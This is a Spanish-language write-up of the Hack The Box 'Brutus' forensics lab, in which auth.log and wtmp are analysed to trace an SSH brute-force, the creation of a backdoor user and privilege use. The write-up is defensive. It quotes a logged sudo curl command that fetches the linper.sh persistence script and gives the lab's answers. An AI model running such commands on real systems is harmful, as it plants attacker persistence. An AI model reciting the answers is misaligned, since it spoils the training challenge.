---
layout: archive
title: "Sherlocks - Brutus (HTB)"
author_profile: true
published: true
---


![UTMP]({{ "/images/Brutus/logo.png" | relative_url }})

Los sherlocks (De HackTheBox) son retos gamificados enfocados a __Blue Team__, en ellos, se encuentran distintas situaciones donde uno debe utilizar herramientas de analsis y artefactos para completar las tareas. Y claro, hay __categorías__ según lo que quieras entrenar, como por ejemplo _DFIR_ (Digital Forensics and Incident Response) que se enfocan en el __análsis de artefactos forenses__ (es decir, trazas de ataques en los sistemas).

## Resumen Brutus

Este primer sherlock es de los más básicos, en él se exploran los conceptos y logs importantes en **autenticación**, **logins** y **logouts** en sistemas linux (hablaremos de ellos un poco más adelante) ya que nos tocará la tarea de anañizar un brute force attack via SSH.

## Laboratorio

### Descripción

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

### Desarrollo

En los archivos adjuntos, nos encontramos con 3 archivos:

1. `auth.log` - Es un log que usan rsyslog como Debian o Ubuntu, en él se registran los intentos de inicios de sesión (fallidos y exitosos) por SSH (y otros servicios que soporten autenticación), usos de 'sudo', 'su' y 'login' y mensajes de servicios que registran autorización o denegación.
2. `wtemp` - Es un log histórico de los inicios y cierres de sesión de usuarios en el sistema (está en binario por lo que ocupa otras herramientas para leerlo).
3. `utemp.py`-  Un pequeño script para parsear wtemp.

El script de python funciona bien para una funcionalidad básica (pero también pueden modificarlo para embellecer un poco la salida porque sale algo dispareja en consola) y es algo así:

![UTMP]({{ "/images/Brutus/utmppy.png" | relative_url }})

Ya entendiendo los 2 archivos, podemos empezar a responder las preguntas del laboratorio:

#### Q1: Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

Esta pregunta se resuelve observando detenidamente el Auth.log (que recordemos, **registrará todos los intentos de inicio de sesión**, si hay un brute force de por medio, este log lo registrará).

En cierto momento, podemos empezar a observar que se empiezan a hacer muchos intentos de autenticación con intentos fallidos sucesivos tras un usuario por uno; esta es la IP que registraremos:

![UTMP]({{ "/images/Brutus/Q1.png" | relative_url }})

```
Q1: 65.2.161.68
```

#### Q2: The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

Ahora, si continuamos viendo detenidamente (Lo cual podemos hacer porque el log es _relativamente_ pequeño) veremos que en uno de los tantos renglones está el string __Accepted ...__ 

![UTMP]({{ "/images/Brutus/Q2.png" | relative_url }})

En el caso que no querramos complicarnos demasiado; podemos buscar directamente el string 'Accepted' como por ejemplo con `nano` con `Ctrl + W` Y buscando 'Accepted', claro, busca aquel que correlacione la IP del atacante (_65.2.161.68_) y el inicio de sesión exitoso y después de todos los intentos de inicio de sesión que ha hecho (también accede como otro usuario y auth.log lo marcará existoso pero en un momento iremos a ello).

```
Q2: root
```

#### Q3: Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

El UTC timestamp es un formato de Horario Universal y tiene el formato `YYYY-MM-DD HH:MM:SS`; eso como primera aclaración, lo segundo es que nos está preguntando por la hora del establecimiento de la sesión, no de la autenticación, por lo que ya nos dice, tenemos que buscar en el wtmp.

Como observarás, en el wtmp, nos da un timestamp, pero este está presentado utilizando el timezone del sistema, no necesariamente UTC, para esta aclaración, podemos utilizar el comando __`date`__ en nuestra terminal e indicará si es __UTC__ (recomiendo probarlo).

El método fácil la verdad es sólo hacer el cálculo, utilizamos __`date`__, ver en qué zona horaria estás y ver su diferencia con respecto al UTC, otra, es investigar sólo con google:

![UTMP]({{ "/images/Brutus/UTCR.png" | relative_url }})

O si también quieres meterte con el sistema, puedes ejecutar el siguiente comando para cambiar la hora a UTC __`sudo timedatectl set-timezone UTC`__ Luego de ello, confirmar el cambio con `date` y volver a parsear wtmp:

![UTMP]({{ "/images/Brutus/Q3.png" | relative_url }})

###### Nota: Para revertir el cambio del horario puedes cambiar el UTC por la zona horaria que tenías o utilizar `sudo timedatectl set-timezone <ZonaHoraria>` (busca las zonas horarias, no las abreviaturas)

Ahora, ¿cuál ingresamos? Para ello tenemos que entender bien la pregunta, se nos dice que luego __el atacante ingresó manualmente__, los ataques de fuerza bruta generalmente prueban la credencial, determnan si es correcto o incorrecto y luego terminan la conexión; en auth.log podemos ver este comportamiento: El atacante ya con la credencial correcta, se desconecta pero poco después vuelve a conectarse:

![UTMP]({{ "/images/Brutus/autha.png" | relative_url }}) 

Esta, siendo la correspondiente al __brute force__ y...

![UTMP]({{ "/images/Brutus/authb.png" | relative_url }})

Correspondiente al __ingreso manual__ poco tiempo después. 

Si continuamos viendo las horas, podrás darte cuenta que también corresponde por 1 segundo menos, al wtmp, es decir, que estamos viendo el mismo evento. Y finalmente, lo dicho al principio, ingresamos la hora correspondiente al establecimiento de la conexión (la del wtmp)

```
Q3: 2024/03/06 06:32:45
```

#### Q4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

Esta pregunta se resuelve con la aclaración anterior de __auth.log__; sshd asignará un número sesión casi inmediatamente de la autenticación y puede verse claramente:

![UTMP]({{ "/images/Brutus/authb.png" | relative_url }})

```
Q4: 37
```

#### Q5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Esta es una forma de persistencia, el atacante para tener acceso sin hacer más ruido con una cuenta conocida (por lo tanto), monitoreada, puede intentar crear un usuario para tener acceso y qué mejor, asignarle permisos de administrador en el sistema para el control completo de él. Este tipo de acciones se llevan a cabo pidiendo autenticación, por lo que es probable que queden registradas en _auth.log_.

Viendo el log, podremos notar varios servicios que emitieron un log que está relacionado con la actividad que buscamos: _groupadd_ y _useradd_ y para nuestra fortuna, podremos ver los cambios que ha hecho y el usuario creado:

![UTMP]({{ "/images/Brutus/Q5.png" | relative_url }})

```
Q5: cyberjunkie
```

#### Q6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

Habiendo aclarado que es una forma de persistencia; podemos buscar en internet tranquilamente; [Persistence - Mitre](https://attack.mitre.org/tactics/TA0003/) Y buscar por la que más se parezca a la acción, que es crear una cuenta.

![UTMP]({{ "/images/Brutus/Q6.png" | relative_url }})

Nos pregunta por la sub técnica, que es la acción específica realizada: _¿Creó una cuenta en un servicio de nube? ¿Creó la cuenta en un dominio (AD)? ¿Creó una cuenta local? ¿Creó otro tipo de cuenta?_ Estas preguntas nos ayudarán en identificar específicamente la sub técnica utilizada (o si no corresponde a una subtécnica). Como el atacante creó la cuenta sólo en la máquina, corresponde a la 001 (recuerda que el formato es T<ID Técnica>.<ID Sub Técnica>)

```
Q6: T1136.001
``` 

#### Q7: What time did the attacker's first SSH session end according to auth.log?

Para resolver la pregunta, sólo tenemos que observar cuándo el usuario `cyberjunkie` (que sabemos es el atacante) ingresa mediante SSH:


![UTMP]({{ "/images/Brutus/Q7a.png" | relative_url }})

```
Q7: 2024-03-06 06:37:24
``` 

#### Q8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

Poco más abajo del login, sin tanta complicación, podremos ver el servicio sudo generando un log y para llamar más la atención, un curl hacia github:

![UTMP]({{ "/images/Brutus/Q8.png" | relative_url }})

```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

```
Q8: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.
